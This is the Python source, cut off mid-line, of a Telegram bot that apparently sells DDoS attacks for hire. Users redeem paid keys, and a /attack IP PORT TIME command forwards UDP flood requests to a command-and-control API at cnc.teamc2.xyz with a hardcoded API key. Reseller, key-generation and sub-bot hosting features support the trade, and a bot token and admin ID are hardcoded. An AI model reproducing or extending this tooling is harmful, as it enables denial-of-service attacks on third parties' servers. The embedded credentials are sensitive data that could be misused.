#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
import random
import string
import re
from datetime import datetime, timedelta
from collections import defaultdict

# ========== CONFIG ==========
BOT_TOKEN = "8291785662:AAHlFw4PQS_H7HKCC9ArvFS9lZ8KzbdZTGM"
ADMIN_ID = ["8487946379"]
API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
API_KEY = "WTRMWL"
GLOBAL_CONCURRENT = 2
COOLDOWN_TIME = 30

# ========== FILE PATHS ==========
DATA_DIR = "data"
USERS_FILE = os.path.join(DATA_DIR, "users.json")
KEYS_FILE = os.path.join(DATA_DIR, "keys.json")
GROUPS_FILE = os.path.join(DATA_DIR, "groups.json")
HOSTED_BOTS_FILE = os.path.join(DATA_DIR, "hosted_bots.json")
SETTINGS_FILE = os.path.join(DATA_DIR, "settings.json")
BROADCAST_FILE = os.path.join(DATA_DIR, "broadcast_users.json")

# ========== CREATE DATA DIRECTORY ==========
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

# ========== DATA STRUCTURES ==========
active_attacks = {}
cooldown = {}
hosted_bots = {}
hosted_bot_instances = {}
maintenance_mode = False

# ========== FILE FUNCTIONS ==========
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        data = {"users": [ADMIN_ID[0]], "resellers": []}
        save_users(data)
        return data

def save_users(data):
    with open(USERS_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def load_keys():
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_keys(data):
    with open(KEYS_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def load_groups():
    try:
        with open(GROUPS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_groups(data):
    with open(GROUPS_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def load_hosted_bots():
    try:
        with open(HOSTED_BOTS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_hosted_bots(data):
    with open(HOSTED_BOTS_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def load_settings():
    try:
        with open(SETTINGS_FILE, 'r') as f:
            return json.load(f)
    except:
        data = {"global_concurrent": 2, "cooldown": 30}
        save_settings(data)
        return data

def save_settings(data):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def load_broadcast_users():
    try:
        with open(BROADCAST_FILE, 'r') as f:
            return json.load(f)
    except:
        data = {"users": []}
        save_broadcast_users(data)
        return data

def save_broadcast_users(data):
    with open(BROADCAST_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# ========== LOAD DATA ==========
users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()
groups = load_groups()
hosted_bots = load_hosted_bots()
settings = load_settings()
broadcast_data = load_broadcast_users()
broadcast_users = broadcast_data.get("users", [])

GLOBAL_CONCURRENT = settings.get("global_concurrent", 2)
COOLDOWN_TIME = settings.get("cooldown", 30)

bot = telebot.TeleBot(BOT_TOKEN)

# ========== HELPER FUNCTIONS ==========
def check_maintenance():
    return maintenance_mode

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    if duration_str.isdigit():
        return int(duration_str), "day"
    if duration_str.endswith('h'):
        hours = duration_str.replace('h', '')
        if hours.isdigit():
            return int(hours), "hour"
    return None, None

def get_expiry_date(value, unit):
    if unit == "hour":
        return datetime.now() + timedelta(hours=value)
    else:
        return datetime.now() + timedelta(days=value)

def format_duration(value, unit):
    if unit == "hour":
        return f"{value} Hour(s)"
    return f"{value} Day(s)"

def get_main_active_count():
    now = time.time()
    for attack_id, info in list(active_attacks.items()):
        if now >= info["finish_time"]:
            del active_attacks[attack_id]
    return len(active_attacks)

def check_active_attack_by_target(ip, port):
    target_key = f"{ip}:{port}"
    now = time.time()
    for attack_id, attack_info in list(active_attacks.items()):
        if attack_info["target_key"] == target_key:
            if now < attack_info["finish_time"]:
                return attack_info
            else:
                del active_attacks[attack_id]
                return None
    return None

def format_attack_status():
    now = time.time()
    slots = []
    for attack_id, info in active_attacks.items():
        if now < info["finish_time"]:
            remaining = int(info["finish_time"] - now)
            slots.append({
                "target": info["target_key"],
                "user": info["user"],
                "remaining": remaining
            })
    
    slots_status = []
    for i in range(GLOBAL_CONCURRENT):
        if i < len(slots):
            remaining = slots[i]['remaining']
            mins = remaining // 60
            secs = remaining % 60
            time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
            slots_status.append(f"❌ SLOT {i+1}: BUSY\n└ 🎯 {slots[i]['target']}\n└ 👤 {slots[i]['user']}\n└ ⏰ {time_str} left")
        else:
            slots_status.append(f"✅ SLOT {i+1}: FREE\n└ 💡 Ready for attack")
    
    return slots_status

def remove_user_from_system(user_id):
    if user_id in users:
        users.remove(user_id)
    if user_id in resellers:
        resellers.remove(user_id)
    users_data["users"] = users
    users_data["resellers"] = resellers
    save_users(users_data)
    
    for attack_id in list(active_attacks.keys()):
        if active_attacks[attack_id]["user"] == user_id:
            del active_attacks[attack_id]
    
    if user_id in cooldown:
        del cooldown[user_id]
    
    return True

def check_user_expiry(user_id):
    now = time.time()
    for key, info in keys_data.items():
        if info.get("used_by") == user_id and info.get("used") == True and now < info["expires_at"]:
            return True
    return False

def stop_hosted_bot(bot_token):
    try:
        if bot_token in hosted_bot_instances:
            try:
                hosted_bot_instances[bot_token].stop_polling()
            except:
                pass
            del hosted_bot_instances[bot_token]
        if bot_token in hosted_bots:
            del hosted_bots[bot_token]
        save_hosted_bots(hosted_bots)
        return True
    except:
        return False

# ========== SEND ATTACK FUNCTION (CORRECT API FORMAT) ==========
def send_attack(ip, port, duration, chat_id, bot_instance, is_hosted=False, bot_token=None):
    """Send attack to API with correct format"""
    max_retries = 3
    for attempt in range(max_retries):
        try:
            # Correct API format as per working example
            api_params = {
                "api_key": API_KEY,
                "target": ip,
                "port": port,
                "time": duration,
                "concurrent": 1
            }
            
            response = requests.get(API_URL, params=api_params, timeout=30)
            
            if response.status_code == 200:
                time.sleep(duration)
                bot_instance.send_message(chat_id, f"✅ ATTACK FINISHED!\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔄 Restart your game!")
                return True
            else:
                if attempt < max_retries - 1:
                    time.sleep(2)
                    continue
                bot_instance.send_message(chat_id, f"❌ Attack failed! API Status: {response.status_code}")
                return False
                
        except requests.exceptions.Timeout:
            if attempt < max_retries - 1:
                time.sleep(2)
                continue
            bot_instance.send_message(chat_id, "❌ Attack failed! API timeout.")
            return False
            
        except requests.exceptions.ConnectionError:
            if attempt < max_retries - 1:
                time.sleep(2)
                continue
            bot_instance.send_message(chat_id, "❌ Attack failed! Cannot connect to API.")
            return False
            
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(2)
                continue
            bot_instance.send_message(chat_id, f"❌ Attack failed! {str(e)[:50]}")
            return False
    
    return False

# ========== AUTO KEY EXPIRY CLEANUP ==========
def cleanup_expired_keys():
    while True:
        time.sleep(60)
        now = time.time()
        expired_keys = []
        
        for key, info in keys_data.items():
            if info.get("used", False) and now > info["expires_at"]:
                expired_keys.append(key)
        
        for key in expired_keys:
            user_id = keys_data[key].get("used_by")
            if user_id and user_id not in ADMIN_ID:
                has_other = False
                for k, v in keys_data.items():
                    if v.get("used_by") == user_id and v.get("used", False) and k != key:
                        if now < v["expires_at"]:
                            has_other = True
                            break
                if not has_other and user_id in users:
                    users.remove(user_id)
                    users_data["users"] = users
                    save_users(users_data)
                    try:
                        bot.send_message(user_id, "⚠️ YOUR ACCESS HAS EXPIRED!\n\nYour key has expired.\nContact admin to get a new key.")
                    except:
                        pass
            del keys_data[key]
        
        if expired_keys:
            save_keys(keys_data)
            print(f"✅ Expired {len(expired_keys)} keys")

cleanup_thread = threading.Thread(target=cleanup_expired_keys, daemon=True)
cleanup_thread.start()

# ========== HOST BOT FUNCTION ==========
def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
    try:
        print(f"🔄 Starting hosted bot...")
        
        if bot_token in hosted_bot_instances:
            try:
                hosted_bot_instances[bot_token].stop_polling()
                time.sleep(1)
            except:
                pass
            del hosted_bot_instances[bot_token]
        
        test_bot = telebot.TeleBot(bot_token)
        test_bot.remove_webhook()
        time.sleep(2)
        
        bot_info = test_bot.get_me()
        print(f"✅ Hosted bot @{bot_info.username} is valid")
        
        hosted_bot = telebot.TeleBot(bot_token)
        hosted_bot_instances[bot_token] = hosted_bot
        hosted_cooldown_data = {}
        
        @hosted_bot.message_handler(commands=['start'])
        def hosted_start(msg):
            hosted_bot.reply_to(msg, f"✨ DDOS BOT ✨\n\n👑 Owner: {owner_name}\n✅ Status: Active\n⚡ Concurrent: {concurrent}\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/cooldown\n/addreseller USER_ID\n/removereseller USER_ID\n/genkey 1 or 5h\n/addgroup GROUP_ID TIME\n/mykeys\n/redeem KEY\n/help")
        
        @hosted_bot.message_handler(commands=['cooldown'])
        def hosted_cooldown(msg):
            uid = str(msg.chat.id)
            if uid in hosted_cooldown_data:
                remaining = hosted_cooldown_data[uid] - time.time()
                if remaining > 0:
                    hosted_bot.reply_to(msg, f"⏳ Cooldown: {int(remaining)}s remaining!")
                else:
                    del hosted_cooldown_data[uid]
                    hosted_bot.reply_to(msg, "✅ No cooldown! You can attack now.")
            else:
                hosted_bot.reply_to(msg, "✅ No cooldown! You can attack now.")
        
        @hosted_bot.message_handler(commands=['addgroup'])
        def hosted_add_group(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can add groups!")
                return
            args = msg.text.split()
            if len(args) != 3:
                hosted_bot.reply_to(msg, "⚠️ Usage: /addgroup GROUP_ID TIME\n📌 Example: /addgroup -100123456789 60")
                return
            group_id = args[1]
            try:
                attack_time = int(args[2])
                if attack_time < 10 or attack_time > 300:
                    hosted_bot.reply_to(msg, "❌ Attack time must be 10-300 seconds!")
                    return
            except:
                hosted_bot.reply_to(msg, "❌ Invalid time!")
                return
            groups[group_id] = {"attack_time": attack_time, "added_by": uid, "added_at": time.time()}
            save_groups(groups)
            hosted_bot.reply_to(msg, f"✅ GROUP ADDED!\n👥 Group ID: {group_id}\n⏱️ Attack Time: {attack_time}s")
        
        @hosted_bot.message_handler(commands=['removegroup'])
        def hosted_remove_group(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can remove groups!")
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /removegroup GROUP_ID")
                return
            group_id = args[1]
            if group_id in groups:
                del groups[group_id]
                save_groups(groups)
                hosted_bot.reply_to(msg, f"✅ GROUP REMOVED!\n👥 Group ID: {group_id}")
            else:
                hosted_bot.reply_to(msg, "❌ Group not found!")
        
        @hosted_bot.message_handler(commands=['attack'])
        def hosted_attack(msg):
            uid = str(msg.chat.id)
            
            if uid not in users:
                hosted_bot.reply_to(msg, "❌ ACCESS DENIED!\n\nYou don't have an active key.\nUse /redeem KEY to activate your access.")
                return
            
            if not check_user_expiry(uid):
                hosted_bot.reply_to(msg, "❌ ACCESS EXPIRED!\n\nYour key has expired.\nUse /redeem KEY to get new access.")
                return
            
            args = msg.text.split()
            if len(args) != 4:
                hosted_bot.reply_to(msg, "⚠️ Usage: /attack IP PORT TIME\n📌 Example: /attack 1.1.1.1 443 60")
                return
            
            ip, port, duration = args[1], args[2], args[3]
            try:
                port = int(port)
                duration = int(duration)
                if duration < 10 or duration > 300:
                    hosted_bot.reply_to(msg, "❌ Duration must be 10-300 seconds!")
                    return
            except:
                hosted_bot.reply_to(msg, "❌ Invalid port or time!")
                return
            
            # Check hosted bot's own concurrent limit
            if bot_token in hosted_bots:
                bot_info = hosted_bots[bot_token]
                active_in_this_bot = 0
                now = time.time()
                for aid, ainfo in bot_info.get("active_attacks", {}).items():
                    if now < ainfo["finish_time"]:
                        active_in_this_bot += 1
                
                if active_in_this_bot >= concurrent:
                    hosted_bot.reply_to(msg, f"❌ CONCURRENT LIMIT REACHED!\n📊 Active attacks: {active_in_this_bot}/{concurrent}\n💡 Use /status to check when a slot frees up")
                    return
            
            now = time.time()
            
            if uid in hosted_cooldown_data:
                remaining = hosted_cooldown_data[uid] - now
                if remaining > 0:
                    hosted_bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!")
                    return
            
            attack_id = f"hosted_{bot_token}_{uid}_{int(now)}"
            target_key = f"{ip}:{port}"
            finish_time = now + duration
            
            # Check target under attack
            target_under_attack = False
            if bot_token in hosted_bots:
                for aid, ainfo in hosted_bots[bot_token].get("active_attacks", {}).items():
                    if ainfo["target_key"] == target_key and now < ainfo["finish_time"]:
                        target_under_attack = True
                        break
            
            if target_under_attack:
                hosted_bot.reply_to(msg, f"❌ TARGET UNDER ATTACK!\n🎯 {target_key} is already being attacked.\n⏰ Please wait for it to finish.")
                return
            
            hosted_cooldown_data[uid] = now + COOLDOWN_TIME
            
            if bot_token not in hosted_bots:
                hosted_bots[bot_token] = {"active_attacks": {}, "owner_id": owner_id, "owner_name": owner_name, "concurrent": concurrent}
            if "active_attacks" not in hosted_bots[bot_token]:
                hosted_bots[bot_token]["active_attacks"] = {}
            
            hosted_bots[bot_token]["active_attacks"][attack_id] = {
                "user": uid,
                "finish_time": finish_time,
                "ip": ip,
                "port": port,
                "target_key": target_key
            }
            save_hosted_bots(hosted_bots)
            
            new_active = 0
            for aid, ainfo in hosted_bots[bot_token]["active_attacks"].items():
                if now < ainfo["finish_time"]:
                    new_active += 1
            
            hosted_bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n📊 Active Slots: {new_active}/{concurrent}\n🔄 Sending to API...")
            
            def run():
                send_attack(ip, port, duration, msg.chat.id, hosted_bot, is_hosted=True, bot_token=bot_token)
                
                # Cleanup
                if bot_token in hosted_bots and attack_id in hosted_bots[bot_token]["active_attacks"]:
                    del hosted_bots[bot_token]["active_attacks"][attack_id]
                    save_hosted_bots(hosted_bots)
            
            threading.Thread(target=run).start()
        
        @hosted_bot.message_handler(commands=['status'])
        def hosted_status(msg):
            if bot_token in hosted_bots:
                bot_info = hosted_bots[bot_token]
                now = time.time()
                active_list = []
                
                for aid, info in bot_info.get("active_attacks", {}).items():
                    if now < info["finish_time"]:
                        remaining = int(info["finish_time"] - now)
                        mins = remaining // 60
                        secs = remaining % 60
                        time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
                        active_list.append(f"❌ SLOT {len(active_list)+1}: BUSY\n└ 🎯 {info['target_key']}\n└ 👤 {info['user']}\n└ ⏰ {time_str} left")
                
                status_msg = f"📊 SLOT STATUS\n\n"
                for i in range(bot_info["concurrent"]):
                    if i < len(active_list):
                        status_msg += active_list[i] + "\n\n"
                    else:
                        status_msg += f"✅ SLOT {i+1}: FREE\n└ 💡 Ready for attack\n\n"
                
                status_msg += f"📊 TOTAL ACTIVE: {len(active_list)}/{bot_info['concurrent']}"
                hosted_bot.reply_to(msg, status_msg)
            else:
                hosted_bot.reply_to(msg, "✅ ALL SLOTS FREE ✅\n\nNo ongoing attacks detected!")
        
        @hosted_bot.message_handler(commands=['addreseller'])
        def hosted_add_reseller(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.r
